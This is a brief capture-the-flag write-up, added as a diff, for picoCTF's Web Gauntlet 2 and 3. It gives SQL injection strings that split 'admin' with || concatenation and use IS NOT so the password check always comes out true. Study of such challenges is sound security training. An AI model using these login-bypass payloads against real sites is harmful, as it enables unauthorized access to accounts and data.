@@ -1,0 +1,12 @@
+picoctf web gauntlet 2,3 writeup
+
+1.also use || to pass "admin" filter
+
+2.and use IS and NOT to let password be true
+
+user="ad'||'min"
+password="s' IS NOT 'd"
+
+3.get flag!
+
+# third challenge also can use this to pass
